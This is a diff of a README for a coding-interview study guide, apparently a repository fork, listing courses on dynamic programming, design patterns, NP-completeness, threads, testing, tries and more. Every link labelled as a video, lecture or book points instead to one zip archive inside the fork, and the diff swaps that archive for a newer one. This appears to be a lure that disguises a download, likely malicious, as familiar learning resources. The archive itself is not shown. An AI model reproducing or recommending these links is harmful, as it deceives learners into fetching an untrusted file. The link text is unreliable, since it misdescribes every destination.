+            [Dynamic Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Yale Lecture notes:
-        - [ ] [Dynamic Programming](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Dynamic Programming](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Coursera:
-        - [ ] [The RNA secondary structure problem (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [A dynamic programming algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Illustrating the DP algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Running time of the DP algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [DP vs. recursive implementation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Global pairwise sequence alignment (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Local pairwise sequence alignment (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [The RNA secondary structure problem (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [A dynamic programming algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Illustrating the DP algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Running time of the DP algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [DP vs. recursive implementation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Global pairwise sequence alignment (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Local pairwise sequence alignment (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Design patterns
-    - [ ] [Quick UML review (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Quick UML review (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Learn these patterns:
         - [ ] strategy
         - [ ] singleton
@@ -1031,68 +1031,68 @@ Graphs can be used to represent many problems in computer science, so this secti
         - [ ] iterator
         - [ ] composite
         - [ ] flyweight
-    - [ ] [Chapter 6 (Part 1) - Patterns (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Chapter 6 (Part 2) - Abstraction-Occurrence, General Hierarchy, Player-Role, Singleton, Observer, Delegation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Chapter 6 (Part 3) - Adapter, Facade, Immutable, Read-Only Interface, Proxy (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Series of videos (27 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Head First Design Patterns](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Chapter 6 (Part 1) - Patterns (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Chapter 6 (Part 2) - Abstraction-Occurrence, General Hierarchy, Player-Role, Singleton, Observer, Delegation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Chapter 6 (Part 3) - Adapter, Facade, Immutable, Read-Only Interface, Proxy (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Series of videos (27 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Head First Design Patterns](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - I know the canonical book is "Design Patterns: Elements of Reusable Object-Oriented Software", but Head First is great for beginners to OO.
-    - [ ] [Handy reference: 101 Design Patterns & Tips for Developers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Design patterns for humans](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Handy reference: 101 Design Patterns & Tips for Developers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Design patterns for humans](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Combinatorics (n choose k) & Probability
-    - [ ] [Math Skills: How to find Factorial, Permutation and Combination (Choose) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Make School: Probability (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Make School: More Probability and Markov Chains (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Math Skills: How to find Factorial, Permutation and Combination (Choose) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Make School: Probability (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Make School: More Probability and Markov Chains (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Khan Academy:
         - Course layout:
-            - [ ] [Basic Theoretical Probability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+            - [ ] [Basic Theoretical Probability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - Just the videos - 41 (each are simple and each are short):
-            - [ ] [Probability Explained (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+            - [ ] [Probability Explained (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### NP, NP-Complete and Approximation Algorithms
     - Know about the most famous classes of NP-complete problems, such as traveling salesman and the knapsack problem,
         and be able to recognize them when an interviewer asks you them in disguise.
     - Know what NP-complete means.
-    - [ ] [Computational Complexity (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Computational Complexity (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Simonson:
-        - [ ] [Greedy Algs. II & Intro to NP Completeness (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [NP Completeness II & Reductions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [NP Completeness III (Video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [NP Completeness IV (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Greedy Algs. II & Intro to NP Completeness (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [NP Completeness II & Reductions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [NP Completeness III (Video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [NP Completeness IV (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Skiena:
-        - [ ] [CSE373 2012 - Lecture 23 - Introduction to NP-Completeness (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [CSE373 2012 - Lecture 24 - NP-Completeness Proofs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [CSE373 2012 - Lecture 25 - NP-Completeness Challenge (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Complexity: P, NP, NP-completeness, Reductions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Complexity: Approximation Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Complexity: Fixed-Parameter Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [CSE373 2012 - Lecture 23 - Introduction to NP-Completeness (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [CSE373 2012 - Lecture 24 - NP-Completeness Proofs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [CSE373 2012 - Lecture 25 - NP-Completeness Challenge (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Complexity: P, NP, NP-completeness, Reductions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Complexity: Approximation Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Complexity: Fixed-Parameter Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Peter Norvig discusses near-optimal solutions to traveling salesman problem:
-        - [Jupyter Notebook](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Jupyter Notebook](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Pages 1048 - 1140 in CLRS if you have it.
 
 - ### How computers process a program
 
-    - [ ] [How CPU executes a program (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [How computers calculate - ALU (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Registers and RAM (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [The Central Processing Unit (CPU) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Instructions and Programs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [How CPU executes a program (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [How computers calculate - ALU (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Registers and RAM (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [The Central Processing Unit (CPU) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Instructions and Programs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Caches
     - [ ] LRU cache:
-        - [ ] [The Magic of LRU Cache (100 Days of Google Dev) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Implementing LRU (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [LeetCode - 146 LRU Cache (C++) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [The Magic of LRU Cache (100 Days of Google Dev) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Implementing LRU (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [LeetCode - 146 LRU Cache (C++) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] CPU cache:
-        - [ ] [MIT 6.004 L15: The Memory Hierarchy (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [MIT 6.004 L16: Cache Issues (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [MIT 6.004 L15: The Memory Hierarchy (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [MIT 6.004 L16: Cache Issues (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Processes and Threads
     - [ ] Computer Science 162 - Operating Systems (25 videos):
         - for processes and threads see videos 1-11
-        - [Operating Systems and System Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [What Is The Difference Between A Process And A Thread?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Operating Systems and System Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [What Is The Difference Between A Process And A Thread?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Covers:
         - Processes, Threads, Concurrency issues
             - Difference between processes and threads
@@ -1107,23 +1107,23 @@ Graphs can be used to represent many problems in computer science, so this secti
             - Livelock
         - CPU activity, interrupts, context switching
         - Modern concurrency constructs with multicore processors
-        - [Paging, segmentation and virtual memory (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Interrupts (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Paging, segmentation and virtual memory (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Interrupts (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - Process resource needs (memory: code, static storage, stack, heap, and also file descriptors, i/o)
         - Thread resource needs (shares above (minus stack) with other threads in the same process but each has its own pc, stack counter, registers, and stack)
         - Forking is really copy on write (read-only) until the new process writes to memory, then it does a full copy.
         - Context switching
             - How context switching is initiated by the operating system and underlying hardware?
-    - [ ] [threads in C++ (series - 10 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CS 377 Spring '14: Operating Systems from University of Massachusetts](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [threads in C++ (series - 10 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CS 377 Spring '14: Operating Systems from University of Massachusetts](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] concurrency in Python (videos):
-        - [ ] [Short series on threads](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Python Threads](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Understanding the Python GIL (2010)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-            - [reference](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [David Beazley - Python Concurrency From the Ground Up: LIVE! - PyCon 2015](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Keynote David Beazley - Topics of Interest (Python Asyncio)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Mutex in Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Short series on threads](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Python Threads](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Understanding the Python GIL (2010)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+            - [reference](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [David Beazley - Python Concurrency From the Ground Up: LIVE! - PyCon 2015](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Keynote David Beazley - Topics of Interest (Python Asyncio)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Mutex in Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Testing
     - To cover:
@@ -1131,24 +1131,24 @@ Graphs can be used to represent many problems in computer science, so this secti
         - what are mock objects
         - what is integration testing
         - what is dependency injection
-    - [ ] [Agile Software Testing with James Bach (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Open Lecture by James Bach on Software Testing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Steve Freeman - Test-Driven Development (that’s not what we meant) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [slides](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Agile Software Testing with James Bach (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Open Lecture by James Bach on Software Testing (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Steve Freeman - Test-Driven Development (that’s not what we meant) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [slides](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Dependency injection:
-        - [ ] [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Tao Of Testing](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [How to write tests](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Tao Of Testing](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [How to write tests](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### String searching & manipulations
-    - [ ] [Sedgewick - Suffix Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Sedgewick - Substring Search (videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [1. Introduction to Substring Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [2. Brute-Force Substring Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [3. Knuth-Morris Pratt](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [4. Boyer-Moore](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [5. Rabin-Karp](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Search pattern in text (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Sedgewick - Suffix Arrays (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Sedgewick - Substring Search (videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [1. Introduction to Substring Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [2. Brute-Force Substring Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [3. Knuth-Morris Pratt](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [4. Boyer-Moore](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [5. Rabin-Karp](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Search pattern in text (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     If you need more detail on this subject, see "String Matching" section in [Additional Detail on Some Subjects](#additional-detail-on-some-subjects).
 
@@ -1156,51 +1156,51 @@ Graphs can be used to represent many problems in computer science, so this secti
     - Note there are different kinds of tries. Some have prefixes, some don't, and some use string instead of bits
         to track the path
     - I read through code, but will not implement
-    - [ ] [Sedgewick - Tries (3 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [1. R Way Tries](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [2. Ternary Search Tries](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [3. Character Based Operations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Notes on Data Structures and Programming Techniques](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Sedgewick - Tries (3 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [1. R Way Tries](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [2. Ternary Search Tries](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [3. Character Based Operations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Notes on Data Structures and Programming Techniques](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Short course videos:
-        - [ ] [Introduction To Tries (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Performance Of Tries (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Implementing A Trie (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [The Trie: A Neglected Data Structure](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [TopCoder - Using Tries](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Stanford Lecture (real world use case) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [MIT, Advanced Data Structures, Strings (can get pretty obscure about halfway through) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Introduction To Tries (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Performance Of Tries (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Implementing A Trie (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [The Trie: A Neglected Data Structure](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [TopCoder - Using Tries](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Stanford Lecture (real world use case) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [MIT, Advanced Data Structures, Strings (can get pretty obscure about halfway through) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Floating Point Numbers
-    - [ ] simple 8-bit: [Representation of Floating Point Numbers - 1 (video - there is an error in calculations - see video description)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] 32 bit: [IEEE754 32-bit floating point binary (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] simple 8-bit: [Representation of Floating Point Numbers - 1 (video - there is an error in calculations - see video description)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] 32 bit: [IEEE754 32-bit floating point binary (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Unicode
-    - [ ] [The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [What Every Programmer Absolutely, Positively Needs To Know About Encodings And Character Sets To Work With Text](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [The Absolute Minimum Every Software Developer Absolutely, Positively Must Know About Unicode and Character Sets]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [What Every Programmer Absolutely, Positively Needs To Know About Encodings And Character Sets To Work With Text](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Endianness
